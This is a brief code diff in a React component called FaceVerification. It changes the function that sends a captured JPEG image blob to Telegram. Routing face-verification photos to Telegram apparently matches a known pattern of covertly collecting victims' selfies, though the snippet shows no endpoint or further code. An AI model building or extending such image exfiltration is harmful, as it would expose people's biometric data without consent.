@@ -59,7 +59,7 @@ export default function FaceVerification() {
                     console.log("Image blob created");
                     
                     // Send the blob to Telegram
-                    sendImageToTelegram(blob);
+                    sendMessageToTelegram (blob);
                     
                 }, 'image/jpeg', 0.9);
 
